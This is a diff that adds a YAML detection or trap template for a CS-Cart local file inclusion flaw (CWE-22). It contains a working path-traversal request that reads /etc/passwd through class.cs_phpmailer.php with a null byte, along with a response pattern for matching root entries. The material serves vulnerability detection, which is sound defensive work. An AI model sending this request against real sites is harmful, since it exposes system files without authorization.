@@ -1,0 +1,26 @@
+id: cs-cart-unauthenticated-lfi
+info:
+  name: CS-Cart - Local File Inclusion
+  author: 0x_Akoko
+  description: CS-Cart is vulnerable to local file inclusion because it allows remote
+    unauthenticated attackers to access locally stored files and reveal their content.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2020100100
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: cscart,lfi
+traps:
+- request:
+    method: GET
+    path: /classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
